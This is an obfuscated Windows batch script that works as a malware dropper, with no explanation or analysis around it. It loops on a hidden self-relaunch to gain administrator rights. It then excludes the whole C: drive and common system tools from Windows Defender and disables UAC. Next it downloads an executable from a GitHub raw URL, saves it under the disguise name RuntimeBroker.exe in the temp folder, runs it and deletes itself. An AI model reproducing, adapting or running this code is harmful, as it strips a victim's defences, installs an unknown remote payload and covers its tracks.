@echo off & setlocal enableDelayedExpansion
set "mhGje=NET" & set "ogIv=SESSION" & set "tlmb=2>&1" & set "vhKRs=>nul"
%mhGje% %ogIv% %vhKRs% %tlmb%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "wxJ=foo" & set "dvdb=baz" & set "oib=bar" & set "rqvgw=qux" & rem IdcGH XqWTps bNWqVpd
set "LOBMw=powershell -ExecutionPolicy Bypass -Command"
set "FJXJF=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "uQqVT='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "dKK='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!LOBMw! "!FJXJF! !uQqVT! !dKK!" %vhKRs% %tlmb%
set "rRxnG=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "ZQVz=-Name 'EnableLUA' -Value 0"
!LOBMw! "!rRxnG! !ZQVz!" %vhKRs% %tlmb%
set "OMS=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!LOBMw! "!OMS!" %vhKRs% %tlmb%
if !errorlevel! neq 0 (goto %a%)
set "Ewe=timeout /t" & !Ewe! 2 %vhKRs% %tlmb%
set "HKDYw=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "uBh=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "DfW=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!LOBMw! "!HKDYw! !uBh! !DfW!" %vhKRs% %tlmb%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!Ewe! 1 %vhKRs% %tlmb% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %vhKRs% %tlmb%
del /f /q "%~f0" %vhKRs% %tlmb%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %vhKRs% %tlmb%
if !errorlevel! neq 0 (!Ewe! 3 %vhKRs% %tlmb% & goto %b%)
exit /b
